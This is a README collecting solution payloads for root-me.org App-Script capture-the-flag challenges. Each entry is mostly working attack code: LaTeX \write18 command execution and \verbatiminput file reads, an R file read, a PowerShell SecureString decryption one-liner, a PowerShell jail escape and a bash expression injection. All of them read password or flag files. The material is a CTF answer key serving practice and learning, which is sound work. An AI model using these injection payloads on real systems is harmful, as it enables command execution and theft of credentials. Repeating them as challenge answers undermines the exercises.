# root-me.org-payloads

## What is it ?

Some [root-me.org](https://www.root-me.org/) payloads

## R: Code Execution
[R Code Execution challenge](https://www.root-me.org/en/Challenges/App-Script/R-Code-Execution)

### Payload 
```R
read.table("/home/prof-stats/corriges_examens_analyses_stats/2021/flag.txt", sep = "\t", header = TRUE)
```

## LaTeX - Input
[LaTeX - Input challenge](https://www.root-me.org/fr/Challenges/App-Script/LaTeX-Input)

### Payload 
```LaTex
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\verbatiminput{/challenge/app-script/ch23/.passwd}
\end{document}
```

## LaTeX - Command execution
[LaTeX - Command execution challenge](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Command-execution)

### Payload
```LaTex
catcode `\_=12
\documentclass{article}
\begin{document}
\immediate\write18{cat /challenge/app-script/ch24/flag_is_here/512cba42fe46c1f346996b51fa053b15fba17baefa038d434381aa68bba6/.passwd > /tmp/buffer.tmp}
\input{/tmp/buffer.tmp}
\end{document}
```

## Powershell - SecureString
[PowerShell - SecureString challenge](https://www.root-me.org/fr/Challenges/App-Script/Powershell-SecureString)

### Payload
```Powershell
([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.Int
eropServices.Marshal]::SecureStringToBSTR($SecurePassword)))
```

## Powershell - Basic jail
[PowerShell - Basic jail challenge](https://www.root-me.org/fr/Challenges/App-Script/Powershell-Basic-jail)

### Payload
Just type 
```Powershell
Content
```
Then in the prompter type
```bash 
./.passwd
```
Then enter and the flag will be prompt 

### Bash - quoted expression injection
[Bash - quoted expression injection](https://www.root-me.org/fr/Challenges/App-Script/Bash-quoted-expression-injection)

### Payload
```bash
'x[$(echo `cat .passwd`))]'
```
You will get an error message with the flag inside
